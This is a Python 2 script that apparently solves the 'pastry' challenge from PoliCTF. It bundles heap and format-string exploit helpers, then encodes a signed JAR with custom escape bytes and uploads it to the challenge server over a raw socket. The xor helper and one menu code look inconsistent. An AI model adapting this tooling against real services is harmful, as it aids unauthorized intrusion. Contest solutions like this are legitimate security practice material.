__author__ = 'batman'
import struct
import socket
import telnetlib
import hexdump
import time
import hashlib
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0x99)
    return decode_string

def write_entry(f, index, data):
    f.write('2\n')
    f.write(str(index) + '\n')
    f.write(str(len(data)) + '\n')
    f.write(data)
    assert f.readline().strip() == 'OK'

def free_entry(f, index):
    f.write('3\n')
    f.write(str(index) + '\n')
    assert f.readline().strip() == 'OK'

def printf_entry(f, index, delim='END\n'):
    f.write('3\n')
    f.write(str(index) + '\n')
    resp = readuntil(f, delim)[:-len(delim)]
    assert f.readline().strip() == 'OK'
    return resp

def do_printf(f, index, fmt):
    write_entry(f, index, fmt + 'END\n\0')
    return printf_entry(f, index)

def allocate_entry(f, length):
    f.write('1\n')
    f.write(str(length) + '\n')
    index = int(f.readline())
    assert f.readline().strip() == 'OK'
    return index

def strlen_entry(f, index):
    f.write('4\n')
    f.write(str(index) + '\n')
    msg = f.readline().strip()
    assert f.readline().strip() == 'OK'
    return msg

def final_interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
# pastry.polictf.it:80

# These are the special bytes for the encoding/decoding.
INIT_BYTE = 0x17
ESCAPE_BYTE = 0x18
EXIT_BYTE = 0x19

# These are helper flags.
isValidData = False
isEscapingMode = False
isSequenceClosed = False


#  Decoder behavior for the input cake containers:
# ouputStream holds a FileOutputStream, which writes the
# decoded version of the file..
def decode():
    f = open('MyCakeContainerEncoded.jar', 'rb')
    fo = open('MyCakeContainerDecoded.jar', 'wb')

    isValidData = False
    isEscapingMode = False
    isSequenceClosed = False

    result = ''
    t = f.read(1)
    print t
    while (t != '') and (not isSequenceClosed):
        t = ord(t)
        if t == INIT_BYTE and (not isEscapingMode):
            isValidData = True
        else:
            if t == EXIT_BYTE and (not isEscapingMode):
                isValidData = False
                isSequenceClosed = True
            else:
                if (not isEscapingMode) and (t == ESCAPE_BYTE):
                    isEscapingMode = True
                else:
                    if isEscapingMode and (not isValidData):
                        isEscapingMode = False
                    else:
                        if isValidData:
                            isEscapingMode = False
                            result += chr(t)
        t = f.read(1)
        #print t

    fo.write(result)
    f.close()
    fo.close()

def encode():
    f = open('MyCakeContainer_signed.jar', 'rb')
    fo = open('MyCakeContainerEncoded_signed.jar', 'wb')
    result = ''
    isValidData = False
    isEscapingMode = False
    isSequenceClosed = False

    result += '\x17'
    isValidData = True
    t = f.read(1)
    print t
    while (t != '') and (not isSequenceClosed):
        t = ord(t)
        if (t!=0x17) and (t!=0x18) and (t!=0x19):
            result += chr(t)
        else:
            if t == 0x17:
                result += '\x18\x17'
            if t == 0x18:
                result += '\x18\x18'
            if t == 0x19:
                result += '\x18\x19'
        t = f.read(1)
    result+='\x19'
    fo.write(result)
    f.close()
    fo.close()

encode()
#decode()
s = socket.create_connection(('pastry.polictf.it', 80))
print recv_until(s, 'Shop!\n')
f = open('MyCakeContainerEncoded_signed.jar', 'rb')
data = f.read()

s.send(data)
print s.recv(201)
#print recv_until(s, 'Shop!\n')
f.close()
